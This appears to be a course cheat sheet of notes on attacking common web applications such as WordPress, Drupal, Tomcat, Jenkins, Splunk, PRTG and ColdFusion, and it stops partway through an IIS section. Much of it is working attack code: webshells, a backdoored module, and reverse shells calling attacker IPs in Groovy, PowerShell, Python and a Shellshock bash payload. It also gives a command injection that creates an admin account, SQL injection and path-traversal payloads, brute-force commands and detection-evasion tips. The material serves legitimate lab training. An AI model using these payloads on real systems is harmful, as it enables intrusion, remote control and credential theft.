# Attacking Common Applications

1. [Application Discovery & Enumeration](#application-discovery--enumeration)
1. [Content Management Systems (CMS)](#content-management-systems-cms)
1. [Servlet Containers & Software Development](#servlet-containers--software-development)
1. [Infrastructure & Network Monitoring Tools](#infrastructure--network-monitoring-tools)
1. [Customer Service Management & Configuration Management](#customer-service-management--configuration-management)
1. [Common Gateway Interfaces](#common-gateway-interfaces)
1. [Thick Client Applications](#thick-client-applications)
1. [Miscellaneous Applications](#miscellaneous-applications)
1. [Skills Assessment](#skills-assessment)

## Application Discovery & Enumeration

* Web service enumeration example:

  ```sh
  nmap -p 80,443,8000,8080,8180,8888,1000 --open -oA web_discovery -iL scope_list
  # scope_list file contains all IPs in scope
  # we can use the scan result with tools like EyeWitness or Aquatone

  # followed by this, we can enumerate top ports in a host
  sudo nmap --open -sV 10.129.201.50
  ```

* [EyeWitness](https://github.com/FortyNorthSecurity/EyeWitness):

  ```sh
  eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness
  # from nmap output
  # later, we can check the screenshots for context
  ```

## Content Management Systems (CMS)

* WordPress:

  * footprinting:

    ```sh
    # we can check for /robots.txt
    # directories like /wp-admin and /wp-content indicate WordPress

    curl -s http://blog.inlanefreight.local | grep WordPress
    # check for any mentions of WP in site

    curl -s http://blog.inlanefreight.local/ | grep themes
    # check for WP themes

    curl -s http://blog.inlanefreight.local/ | grep plugins
    # check for WP plugins
    # we can browse to plugins directory and check for any versions

    # enumerate the above in posts pages as well

    # check for user enumeration in /wp-login.php
    # error messages can change for valid/invalid usernames
    ```

    ```sh
    # automated scan

    wpscan --url http://blog.inlanefreight.local --enumerate
    ```
  
  * login bruteforce:

    ```sh
    sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
    # password-attack has 2 modes - xmlrpc and wp-login
    # xmlrpc is faster
    ```
  
  * code execution - if we have admin access to WP, we can modify PHP source code with a simple webshell - ```system($_GET[0]);``` - for an uncommon page like '404.php' in an inactive theme:

    ```sh
    curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
    # we can use this to get reverse shell

    # we also use wp_admin_shell_upload from Metasploit
    ```
  
  * leveraging known vulnerabilities - we can check for vulnerabilities associated with WP version, plugins and themes

* Joomla:

  * footprinting:

    ```sh
    curl -s http://dev.inlanefreight.local/ | grep Joomla
    # check if Joomla is mentioned in code

    # check for /robots.txt

    curl -s http://dev.inlanefreight.local/README.txt | head -n 5
    # to find version

    curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
    # check for JS files in media/system/js as well for version

    # we can also check plugins/system/cache/cache.xml
    ```
  
  * enumeration:

    ```sh
    sudo pip3 install droopescan
    # plugin-based scan tool

    droopescan scan --help

    # scan check
    droopescan scan joomla --url http://dev.inlanefreight.local/

    # we can also use older tools like JoomlaScan
    sudo python2.7 -m pip install urllib3
    sudo python2.7 -m pip install certifi
    sudo python2.7 -m pip install bs4

    # check website using JoomlaScan
    python2.7 joomlascan.py -u http://dev.inlanefreight.local

    # we can use a tool like joomla-bruteforce for bruteforcing 'admin'
    wget https://raw.githubusercontent.com/ajnik/joomla-bruteforce/master/joomla-brute.py

    sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
    ```
  
  * if we get admin creds, we can log into the backend at /administrator - we can [customize a template to get RCE](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla#rce).

  * we can consider using non-standard filenames and parameters for webshells, or even password-protect or limit to source IP; once webshell is added, we can use ```curl``` for RCE

  * leverage known vulnerabilities - we can check for any exploits associated with versions of Joomla or plugins; for example, Joomla 3.9.4 is vulnerable to [CVE-2019-10945](https://www.exploit-db.com/exploits/46710):

    ```sh
    # the original exploit from ExploitDB does not work
    wget https://raw.githubusercontent.com/dpgg101/CVE-2019-10945/main/CVE-2019-10945.py

    python3 CVE-2019-10945.py --help

    python3 CVE-2019-10945.py --url "http://app.inlanefreight.local/administrator/" --username admin --password turnkey --dir /
    ```

* Drupal:

  * footprinting:

    ```sh
    curl -s http://drupal.inlanefreight.local | grep Drupal
    # check for mentions of Drupal

    # we can also check for a CHANGELOG.txt or README.txt file

    # we can also check for nodes - content pages
    # URI in form of /node/<nodeid> - /node/1, /node/2, and so on
    ```
  
  * enumeration:

    ```sh
    curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
    # get Drupal version, if we have access to CHANGELOG.txt

    droopescan scan drupal -u http://drupal.inlanefreight.local
    ```
  
  * PHP filter module:

    * in older versions of Drupal (before version 8), we can login as admin and enable 'PHP filter' module for executing PHP code

    * then, we can save config and create a basic page (Content > Add content > Basic page)

    * we can use a simple PHP webshell by setting text format to 'PHP code'; use md5 hashes for parameter names instead of 'cmd' or 'c' to avoid detection:

      ```php
      <?php
      system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
      ?>
      ```

    * for RCE:

      ```sh
      curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"
      ```

    * in later versions, as PHP filter module is not installed by default, we will have to set it up

    * download the most recent version from Drupal:

      ```sh
      wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
      # check version first
      ```

    * then, on the Drupal site, navigate to Available Updates for installing modules (location depends on version), and upload and install the module file
  
  * Backdoored module:

    ```sh
    # download the archive for any module from Drupal
    wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
    # for example, the CAPTCHA module

    tar xvf captcha-8.x-1.2.tar.gz
    # unarchive

    vim shell.php
    # create a simple webshell

    vim .htaccess
    # rewrite required for access to /modules

    mv shell.php .htaccess captcha

    tar cvf captcha.tar.gz captcha/
    # create archive for module

    # if we have admin access to website, we can install new module
    # here, we can upload and install this backdoored module

    # then, we can get RCE
    curl -s drupal.inlanefreight.local/modules/captcha/shell.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
    ```

    ```html
    <IfModule mod_rewrite.c>
    RewriteEngine On
    RewriteBase /
    </IfModule>
    ```
  
  * leveraging known vulnerabilities - the most well-known vulnerabilities are the Drupalgeddon ones for RCE - CVE-2014-3704 for Drupalgeddon, CVE-2018-7600 for Drupalgeddon2 and CVE-2018-7602 for Drupalgeddon3

## Servlet Containers & Software Development

* Tomcat:

  * footprinting:

    * error pages include Tomcat server and version, so we can request an invalid page and check; this does not work for custom pages

    * we can also check /docs:

      ```sh
      curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat 
      # check /docs
      ```

    * important files include ```/conf/tomcat-users.xml``` and ```/webapps/customapp/WEB-INF/web.xml``` (deployment descriptor)
  
  * enumeration:

    ```sh
    # check the /manager and /host-manager directories
    gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt

    # we can try logging into either /manager or /host-manager using default creds
    # like tomcat:tomcat or admin:admin before bruteforce
    ```
  
  * login bruteforce:

    ```sh
    # using metasploit
    msfconsole -q

    use auxiliary/scanner/http/tomcat_mgr_login

    set VHOST web01.inlanefreight.local
    set RPORT 8180
    set STOP_ON_SUCCESS true
    set RHOSTS 10.129.201.58

    options

    run
    # check if creds found

    # if we want to check the tool functioning
    # set proxy to troubleshoot

    set PROXIES HTTP:127.0.0.1:8080

    run
    # now we can view in Burp Suite or ZAP
    # and see the requests being sent with base64-encoding in Authorization header

    # alternatively, we can also use a Python script like Tomcat-Manager-Bruteforce
    python3 mgr_brute.py -U http://web01.inlanefreight.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
    ```
  
  * WAR file upload:

    * if we have valid manager creds, we can navigate to ```/manager/html``` and upload a malicious WAR file

    * we can upload a common JSP webshell archived into a WAR file:

      ```sh
      wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp

      zip -r backup.war cmd.jsp

      # alternatively, we can use msfvenom
      msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war

      # or we can also use multi/http/tomcat_mgr_upload module in metasploit
      ```

    * in ```/manager/html```, after uploading the malicious WAR file, we can see it in the applications list - click on it and specify 'cmd.jsp' in the URL:

      ```sh
      curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id

      # if we are using the msfvenom payload, we need to setup a listener
      # before activating the shell from GUI
      nc -nvlp 4443

      # for cleaning up, we can undeploy this app from the manager GUI
      ```

    * we can also use lightweight versions of [cmd.jsp](https://github.com/SecurityRiskAdvisors/cmd.jsp)
  
  * leveraging known vulnerabilities - check for common vulnerabilities such as [Ghostcat](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1938) (associated with Apache Jserv)

* Jenkins:

  * footprinting:

    * Jenkins runs on Tomcat port 8080 by default, and uses port 5000 to attach slave servers

    * we can fingerprint it using the Jenkins login page; check for default creds like 'admin:admin'
  
  * script console:

    * the script console at /script allows user to run Apache Groovy scripts - we can write webshells or reverse shells in Groovy:

      ```groovy
      r = Runtime.getRuntime()
      p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
      p.waitFor()
      ```

      ```sh
      nc -nvlp 8443
      # we get reverse shell once we run the above script in script console

      # for a Windows-based Jenkins install, we can use the below script
      ```

      ```groovy
      String host="10.10.14.15";
      int port=8443;
      String cmd="cmd.exe";
      Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
      ```

  * leverage known vulnerabilities - check for vulnerabilities associated with Jenkins version

## Infrastructure & Network Monitoring Tools

* Splunk:

  * footprinting:

    * Splunk webserver runs on port 8000 by default; on older versions, default creds are 'admin:changeme', but we should also check for common weak passwords

    * the free version of Splunk does not require authentication - if we manage to log into Splunk, we can browse data, run reports, check dashboards, view apps, create scripts, etc.
  
  * abusing built-in functionality:

    * we can use [malicious Splunk packages](https://github.com/0xjpuff/reverse_shell_splunk) for RCE

    * the custom Splunk app directory should have 'bin' and 'default' folders - 'bin' includes a PS script, a BAT file and a Python script, while 'default' directory has 'inputs.conf' file

    * ```run.ps1```:

      ```ps
      # PS one-liner reverse-shell
      $client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
      ```

    * ```inputs.conf```:

      ```text
      [script://./bin/rev.py]
      disabled = 0  
      interval = 10  
      sourcetype = shell 

      [script://.\bin\run.bat]
      disabled = 0
      sourcetype = shell
      interval = 10
      ```

    * ```run.bat``` (this will run when app is deployed):

      ```cmd
      @ECHO OFF
      PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
      Exit
      ```

    * after creating the files, we can create a tarball or '.spl' file:

      ```cmd
      tar -cvzf updater.tar.gz splunk_shell/
      ```

    * in Splunk, we can choose to 'Install app from file' and upload the malicious app (do not upgrade the app) after starting a listener on attacking machine

    * if we are dealing with a Linux host instead of Windows host, we need to edit the ```rev.py``` file before creating the tarball:

      ```py
      import sys,socket,os,pty

      ip="10.10.14.15"
      port="443"
      s=socket.socket()
      s.connect((ip,int(port)))
      [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
      pty.spawn('/bin/bash')
      ```

* PRTG Network Monitor:

  * footprinting:

    * we can check for PRTG from nmap scan like ```nmap -p- -sV -T4 10.129.201.50``` - it can be found on common web ports like 80, 443 or 8080

    * default creds are 'prtgadmin:prtgadmin', but we can test with common creds like 'password' or 'Password123' too

    * to find version:

      ```sh
      curl -s http://10.129.201.50:8080/index.htm | grep version
      ```
  
  * leverage known vulnerabilities - check for known vulnerabilities for version, such as CVE-2018-9276, which is an authenticated command injection for PRTG before version 18.2.39:

    * navigate to Setup > Account Settings > Notifications and click on 'Add new notification' (plus icon)

    * give the notification a name, scroll down and enable the option 'Execute Program'

    * under 'Program File', select 'Demo exe notification - outfile.ps1'

    * in the parameter field, we can create a new local admin user by using the payload ```test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add```

    * click on 'Save', after which we will be redirected to the Notifications page

    * we can optionally schedule the notifications to execute the payload for persistence

    * to execute the payload, click the 'Test' button to run our malicious notification (or click on notification and 'send')

    * we will get a pop-up message; if we get an error here we need to check notification settings

    * we can now access the system:

      ```sh
      crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG!
      # check if we have local admin access

      evil-winrm -i 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG!
      # get access
      ```

## Customer Service Management & Configuration Management

* osTicket:

  * footprinting:

    * an osTicket instance uses a ```OSTSESSID``` cookie for the webpage; most installs will also have the logo or 'Support Ticket System' in the footer section

    * ```nmap``` scans will only show info about webserver and not the webapp itself

  * attacking:

    * certain versions such as 1.14.1 suffer from known vulnerabilities like CVE-2020-24881

    * other than that, these support portals can often be used to obtain an email id for a company domain, which can be used to sign up for other exposes apps requiring email verification

    * if we have access to a support portal, we can check for a valid email id (e.g. - <support@inlanefreight.local>) - or a temporary email id provided after creating a ticket

    * this newly-found email address can be used to [register an account on external portals](https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c)

    * if we get access to an authenticated osTicket instance, we can check its components like tickets and address book for any sensitive data exposure

* Gitlab:

  * footprinting:

    * GitLab can be identified by browsing to the target URL - the login page will show its logo

    * only way to footprint GitLab version is by browsing to '/help' when logged in; if the instance allows account creation, we can create one to confirm the version

    * we can also consider trying [low-risk GitLab exploits](https://www.exploit-db.com/exploits/49821)

    * we can browse to '/explore' and check for any public repos - if we get a project, we can enumerate it completetly to get any info

    * for the GitLab instance, we can use the registration form at '/users/sign_up' to enumerate valid usernames or email addresses

    * if we are able to create an account and login, check for any internal projects for further context
  
  * username enumeration:

    * we can use Python scripts like [GitLabUserEnum](https://github.com/dpgg101/GitLabUserEnum) to enumerate list of valid users

    * we should consider account lockout or failed attempts (which can lead to account unlock after certain period)

    * for the found usernames, we can attempt password spraying with common passwords like 'Welcome1' or 'Password123'
  
  * authenticated RCE:

    * GitLab CE version 13.10.2 and lower had an [authenticated RCE vulnerability](https://www.exploit-db.com/exploits/49951)

    * if account creation is allowed, we can create an account and use the above exploit, given it's on an affected version

## Common Gateway Interfaces

* Attacking Tomcat CGI:

  * CVE-2019-0232 is a RCE exploit affecting Windows systems using Tomcat CGI servlets with 'enableCmdLineArguments' feature enabled, for versions 9.0.0.M1 to 9.0.17, 8.5.0 to 8.5.39, and 7.0.0 to 7.0.93

  * CGI (Common Gateway Interface) is used by web servers to render dynamic pages

  * CGI servlet is a middleware that runs on a web server to communicate with external apps (CGI scripts)

  * enumeration:

    ```sh
    nmap -p- -sC -Pn 10.129.204.227 --open
    # check if Apache Tomcat is running a vulnerable version
    ```
  
  * finding CGI scripts:

    ```sh
    ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd -s
    # default directory for CGI scripts is /cgi or /CGI-bin

    ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat -s

    # check for web server content in case of any hits
    ```
  
  * exploitation:

    ```sh
    # suppose we find a batch file 'welcome.bat'
    # we can use command injection using batch command separator '&'

    curl "http://10.129.204.227:8080/cgi/welcome.bat?&dir"

    # we cannot run other commands like 'whoami'

    curl "http://10.129.204.227:8080/cgi/welcome.bat?&set"
    # retrieve list of env variables

    # as the PATH variable has not been set, we need to hardcore path in requests

    curl "http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe"
    # this does not work due to filtering special chars

    # we can use URL-encoding
    curl "http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe"
    ```

* Attacking CGI apps:

  * CVE-2014-6271, or the Shellshock vulnerability, is a flaw in the Bash shell and can offer RCE; it exploits how env variables saves functions

  * we can define an env variable and include a malicious command to check if the system is vulnerable:

    ```sh
    env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
    # if the Bash version is vulnerable, it prints 'vulnerable-shellshock'
    ```
  
  * enumerate by checking for CGI scripts:

    ```sh
    gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi

    # check the script found
    curl -i http://10.129.204.231/cgi-bin/access.cgi
    # even if it does not have any output we can check it further
    ```
  
  * check the vulnerability:

    ```sh
    # modify the User-Agent to include the malicious command
    curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi
    
    # if we get /etc/passwd in output, it is vulnerable

    # alternatively, we can use Burp Suite to fuzz the User-Agent field
    ```
  
  * RCE:

    ```sh
    # on attacker, setup listener
    nc -nvlp 4444

    # use revshell one-liner
    curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/4444 0>&1' http://10.129.204.231/cgi-bin/access.cgi
    ```

## Thick Client Applications

* Attacking thick client apps:

  * thick client (aka rich/fat client) apps - installed locally on client device, do not require internet access to run, and perform better in processing; unlike thin client apps that run on a remote server

  * examples of thick client apps include project management systems, inventory management tools & productivity software; usually seen in enterprise environments

  * thick client apps' architecture is of 2 types -

    * two-tier architecture - app is installed locally on computer, and communicates directly with DB
    * three-tier architecture - app is installed locally on computer, and they communicate with an application server (usually via HTTP/HTTPS) in order to interact with DB - more secure since attackers are not directly communicating with DB
  
  * pentesting steps -

    * info gathering - identify the app architecture, programming languages & frameworks used, and entry points / user inputs; tools like [CFF Explorer](https://ntcore.com/?page_id=388), [Detect It Easy](https://github.com/horsicq/Detect-It-Easy), [Process Monitor](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon) and ```strings``` can be used

    * client side attacks - we can check for vulnerabilities, sensitive info in local files, and reverse-engineering techniques; we can use tools like ```ghidra```, ```radare2```, ```frida``` and other RE tools

    * network side attacks - if app is communicating with a server, network traffic analysis can be used to capture sensitive info; we can use tools like Wireshark, ```tcpdump```, Burp Suite

    * server side attacks - similar to webapp attacks, so most of the vulnerabilities can be checked here
  
  * retrieve hardcoded creds from thick client apps -

    * for the given scenario, we have found an executable 'RestartOracle-Service.exe' from the 'NETLOGON' share of a SMB service

    * after running the executable, we can use a tool like ```ProcMon64``` from [SysInternals](https://learn.microsoft.com/en-gb/sysinternals/downloads/procmon) and monitor the process

    * we can see this app creates a temporary file in ```C:\Users\username\AppData\Local\Temp```

    * in order to capture these files, we need to modify permissions of the 'Temp' folder to disallow file deletions - Right-click folder > Properties > Security > Advanced > username > Disable inheritance > Convert inherited permissions into explicit permissions on this object > Edit > Show advanced permissions > Deselect 'Delete subfolders and files' and 'Delete' checkboxes > click 'Apply' and 'OK'

    * now we can run the app again and check the 'Temp' folder - we can see randomly-named files are created here everytime the service is running

    * on viewing the batch file, we can see two files are being dropped and deleted later before it can be accessed

    * we can try modifying this batch script by removing the deletion part and re-executing the batch file - now we can see the two temporary files - a text file and a PS script

    * running the PS script gives us an executable 'restart-service.exe' - we can run this and repeat the same procedure using ```ProcMon64``` - we can see that the executable is querying the registry

    * to check further, we can start ```x64dbg```, navigate to Options > Preferences, and uncheck everything except 'Exit Breakpoint' - this way the debugging starts directly from the app's exit point

    * then import the executable to start debugging, and right click > Follow in Memory Map

    * memory-mapped files allow apps to access large files without having to read/write the entire file in memory at once; a region of memory is assigned as if it was a buffer - so we can check these for any creds

    * we can check the memory maps at this stage of execution (type 'MAP') - one interesting map with size '3000' and protection set to '-RW--' (scroll to find it) can be checked by double-click - this shows the magic bytes 'MZ', indicating it's a DOS MZ executable

    * we can export this particular map item from memory to dump by right-clicking on the address and selecting 'Dump Memory to File' - we can run ```strings``` on the exported file, which shows we have a .NET executable

    * ```De4Dot``` can be used to reverse .NET executables back to source code - ```de4dot.exe C:\restart-service_0007E000.bin``` - this gives us another cleaned file

    * we can then read the source code of the exported app using the ```DnSpy``` utility - we can navigate to the 'program' section to view the code

* Exploiting web vulnerabilities in thick client apps:

  * thick clients with a three-tier architecture can be exploited by web-specific attacks like SQLi and path traversal

  * enumeration:

    * for given example scenario, we have a server running on port 1337 instead of the usual port 8000; client app relies on 'Java 8' and login creds 'qtc:clarabibi' are mentioned

    * on launching the app and trying to login using given creds, we get a 'Connection Error' - likely the port pointing to the server is incorrect

    * we can launch Wireshark to capture the network traffic and recreate the login issue again

    * as observed from the DNS requests, the client attempts to connect to the 'server.fatty.htb' subdomain - we can add an entry to the hosts file:

      ```cmd
      # launch cmd as admin
      echo 10.10.10.174    server.fatty.htb >> C:\Windows\System32\drivers\etc\hosts
      # check if the entry has been saved properly
      ```

    * inspecting the traffic again shows the client is trying to connect to port 8000 - we need to change this to 1337

    * the given 'fatty-client.jar' is a Java Archive file - extract the files by right-clicking on it

    * launch PowerShell as administrator, navigate to this directory and search for port 8000:

      ```ps
      ls fatty-client\ -recurse | Select-String "8000" | Select Path, LineNumber | Format-List

      # check matched file

      cat fatty-client\beans.xml
      ```

    * we can edit the port value from 8000 to 1337 here; we also find a secret value 'clarabibiclarabibiclarabibi'

    * running this edited app however fails due to a SHA-256 digest mismatch - the hashes are present in ```META-INF/MANIFEST.MF```

    * we can edit this file by removing the hashes, and deleting the '1.RSA' and '1.SF' files from this directory - the modified 'MANIFEST.MF' file should end with a newline:

      ```txt
      Manifest-Version: 1.0
      Archiver-Version: Plexus Archiver
      Built-By: root
      Sealed: True
      Created-By: Apache Maven 3.3.9
      Build-Jdk: 1.8.0_232
      Main-Class: htb.fatty.client.run.Starter

      ```

    * update the JAR file:

      ```ps
      cd .\fatty-client

      jar -cmf .\META-INF\MANIFEST.MF ..\fatty-client-new.jar *
      ```

    * now if we run the new JAR file 'fatty-client-new.jar', we can login as expected
  
  * foothold:

    * navigating to Profile > Whoami shows the user 'qtc' is assigned with 'user' role; furthermore, options like ServerStatus are greyed out, implying there is a higher privilege for this app

    * the FileBrowser section gives us some notes indicating a few issues exist; a message from user 'dave' shows that all admin users are removed from DB and refers to a timeout implemented in login to mitigate time-based SQLi attacks
  
  * path traversal:

    * as we can read files, we can use path traversal payloads:

      ```txt
      ../../../../../../etc/passwd
      ```

    * from the error message, we can see the server filters the '/' character

    * we can decompile the app using [JD-GUI](http://java-decompiler.github.io/) - drag and drop the JAR file, save the source code using 'Save All Sources'

    * decompress the ZIP file; the file ```fatty-client-new.jar.src/htb/fatty/client/methods/Invoker.java``` handles the app features, so we can check its source code

    * the folder option in the above file is set in ```fatty-client-new.jar.src/htb/fatty/client/gui/ClientGuiTest.java``` - in this, we can replace the 'configs' folder name with '..':

      ```java
      ClientGuiTest.this.currentFolder = "..";
      try {
        response = ClientGuiTest.this.invoker.showFiles("..");
      ```

    * then, we can compile the file:

      ```ps
      javac -cp fatty-client-new.jar fatty-client-new.jar.src\htb\fatty\client\gui\ClientGuiTest.java
      ```

    * this generates several class files, we can extract it into a new folder:

      ```ps
      mkdir raw

      cp fatty-client-new.jar raw\fatty-client-new-2.jar
      ```

    * navigate to the new directory, decompress the JAR file; then overwrite the class files with the updated files:

      ```ps
      mv -Force fatty-client-new.jar.src\htb\fatty\client\gui\*.class raw\htb\fatty\client\gui\
      ```

    * build the new JAR file:

      ```ps
      cd raw

      jar -cmf META-INF\MANIFEST.MF traverse.jar .
      ```

    * now if we log into the app and navigate to FileBrowser > Config, we can see the content of the directory ```configs/../``` - we can view the script 'start.sh' here

    * the script shows the 'fatty-server.jar' file is running inside an Alpine Docker container

    * we can modify the 'open' function in ```fatty-client-new.jar.src/htb/fatty/client/methods/Invoker.java``` to download the 'fatty-server.jar' file:

      ```java
      import java.io.FileOutputStream;
      <SNIP>
      public String open(String foldername, String filename) throws MessageParseException, MessageBuildException, IOException {
          String methodName = (new Object() {}).getClass().getEnclosingMethod().getName();
          logger.logInfo("[+] Method '" + methodName + "' was called by user '" + this.user.getUsername() + "'.");
          if (AccessCheck.checkAccess(methodName, this.user)) {
              return "Error: Method '" + methodName + "' is not allowed for this user account";
          }
          this.action = new ActionMessage(this.sessionID, "open");
          this.action.addArgument(foldername);
          this.action.addArgument(filename);
          sendAndRecv();
          String desktopPath = System.getProperty("user.home") + "\\Desktop\\fatty-server.jar";
          FileOutputStream fos = new FileOutputStream(desktopPath);
          
          if (this.response.hasError()) {
              return "Error: Your action caused an error on the application server!";
          }
          
          byte[] content = this.response.getContent();
          fos.write(content);
          fos.close();
          
          return "Successfully saved the file to " + desktopPath;
      }
      <SNIP>
      ```

    * we can rebuild the JAR file using the same steps, and log into the app; now if we navigate to FileBrowser > Config, add the JAR file name in the input field and open it, we can download the JAR file
  
  * SQLi:

    * decompile this JAR file using JD-GUI - we can see ```htb/fatty/server/database/FattyDbSession.class``` contains a ```checkLogin()``` function for login functionality

    * the client app uses the ```setUsername()``` and ```setPassword()``` functions during login to send the values to the server - we can check this from ```htb/fatty/shared/resources/user.java```

    * we can see the username is not sanitized, and the password is changed to the below format:

      ```java
      sha256(username+password+"clarabibimakeseverythingsecure")
      ```

    * the ```checkLogin()``` function writes the SQL exception to a log file - to view the syntax error, we need to edit the code in ```fatty-client-new.jar.src/htb/fatty/client/gui/ClientGuiTest.java```:

      ```java
      ClientGuiTest.this.currentFolder = "../logs";
      try {
        response = ClientGuiTest.this.invoker.showFiles("../logs");
      ```

    * if we attempt a login in the app with a username like ```qtc'``` and then check the logs in 'error-log.txt' file, it confirms SQLi vulnerability

    * we can use a simple payload like ```' or '1'='1``` to bypass the login, but the password comparison step fails

    * we can use UNION queries in SQLi payload, like ```test' UNION SELECT 1,'invaliduser','invalid@a.b','invalidpass','admin``` for the 'username' field; this way, we can control the password and the assigned role

    * we can modify the code in ```htb/fatty/shared/resources/User.java``` to submit the password as it is from the client app:

      ```java
      public User(int uid, String username, String password, String email, Role role) {
          this.uid = uid;
          this.username = username;
          this.password = password;
          this.email = email;
          this.role = role;
      }
      public void setPassword(String password) {
          this.password = password;
        }
      ```

    * if we rebuild the JAR file and attempt login using username payload ```abc' UNION SELECT 1,'abc','a@b.com','abc','admin``` and password payload ```abc```, it works and we get 'admin' role

## Miscellaneous Applications

* ColdFusion:

  * enumeration:

    * ColdFusion uses CFML (ColdFusion Markup Language) to develop dynamic webapps that can be connected to APIs and DBs

    * port 80 for HTTP and port 443 for HTTPS is used by default by ColdFusion server; other than that we can check for file extensions such as ```.cfm``` or ```.cfc```, or check HTTP headers and error messages:

      ```sh
      nmap -p- -sC -Pn 10.129.247.30 --open
      # nmap scan shows port 8500 is open
      # it is the default port used for SSL by ColdFusion
      ```

    * we can enumerate the web directories on this port - the ```/CFIDE/administrator``` path loads the login page, which shows the version
  
  * attacking:

    * we can use ```searchsploit``` to check for exploits for ColdFusion 8, as that is the version in this case; we have directory traversal and RCE exploits

    * directory traversal (CVE-2010-2861) - affects ColdFusion 9.0.1 and earlier versions; we can read arbitrary files by manipulating the ```locale``` parameter for certain ColdFusion files like ```CFIDE/administrator/settings/mappings.cfm``` and ```CFIDE/administrator/enter.cfm```:

      ```http
      http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=en
      ```

      ```http
      http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../etc/passwd
      ```

      ```sh
      searchsploit -p 14641
      # directory traversal exploit
      # -p to copy path

      cp /usr/share/exploitdb/exploits/multiple/remote/14641.py .

      python 14641.py
      # script for directory traversal exploit

      python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
      # password.properties is a config file in ColdFusion, stores encrypted creds
      ```

    * unauthenticated RCE (CVE-2009-2265) - can execute arbitrary code without any creds; this affects versions 8.0.1 and earlier:

      ```sh
      searchsploit -p 50057

      cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .

      vim 50057.py
      # modify script
      # edit the IP and port details

      python3 50057.py
      ```

* IIS Tilde enumeration:

  * when a file/folder is created on an IIS (Internet Information Services) server, Windows generates a short file name in ```8.3 format``` (8 chars for filename, a period, and 3 chars for extension)

  * the tilde ```~``` char, followed by a sequence number, signifies a short file name in a URL - so if we know the short file name, we can use ```~``` in URL to access it

  * for example, if we have a hidden directory 'SecretDocuments', if a request is sent to <http://example.com/~s>, server replies with ```200 OK```, meaning that short name begins with 's'; we can continue appending more characters by fuzzing

  * if two files named 'somefile.txt' and 'somefile1.txt' exist in same directory, their 8.3 short file names would be ```somefi~1.txt``` and ```somefi~2.txt```

  * we can use tools such as [IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner/blob/master/release/iis_shortname_scanner.jar) for enumeration - this requires [setting up Oracle Java](https://ubuntuhandbook.org/index.php/2022/03/install-jdk-18-ubuntu/)

  * enumeration:

    ```sh
    nmap -p- -sV -sC --open 10.129.133.206
    # identify IIS server

